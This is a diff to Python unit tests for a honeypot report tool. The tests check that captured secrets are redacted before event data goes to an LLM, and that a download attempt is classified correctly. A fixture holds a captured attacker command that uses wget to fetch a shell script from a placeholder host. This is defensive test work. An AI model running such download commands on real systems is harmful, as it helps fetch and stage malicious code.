@@ -33,7 +33,9 @@ class AnalysisReportTests(unittest.TestCase):
             SimpleNamespace(id_evento=41, tipo_evento="cowrie.login.failed", fecha_hora=at,
                             datos_originales={"username": "root", "password": "captured-secret"}),
             SimpleNamespace(id_evento=42, tipo_evento="cowrie.command.input", fecha_hora=at + timedelta(seconds=10),
-                            datos_originales={"input": "wget http://example.org/a.sh", "nested": {"token": "captured-token"}}),
+                            datos_originales={"eventid": "cowrie.command.input",
+                                "input": "wget 'http://files.corp.local/a.sh?token=private-query&x=2'",
+                                "nested": {"token": "captured-token"}}),
         ]
         self.env = patch.dict("os.environ", {"LLM_API_KEY": "test-only-key", "LLM_MODEL": "test-model",
                                               "LLM_BASE_URL": "https://example.invalid/v1"})
@@ -62,6 +64,11 @@ class AnalysisReportTests(unittest.TestCase):
         facts = json.loads(request["messages"][1]["content"])
         self.assertNotIn("captured-secret", request["messages"][1]["content"])
         self.assertNotIn("captured-token", request["messages"][1]["content"])
+        self.assertNotIn("private-query", request["messages"][1]["content"])
+        self.assertEqual(facts["observables_por_evento"]["42"], [{
+            "referencia": 1, "tipo": "URL", "campo": "input",
+            "comportamiento": "intento_descarga", "grado_evidencia": "intento",
+        }])
         self.assertEqual(facts["eventos"][0]["datos"]["password"], "[REDACTED]")
         self.assertEqual(facts["contexto_calculado"]["comandos"], 1)
         self.assertEqual(facts['tecnicas_mitre_permitidas'][0]['codigo_tecnica'],'T1059.004')
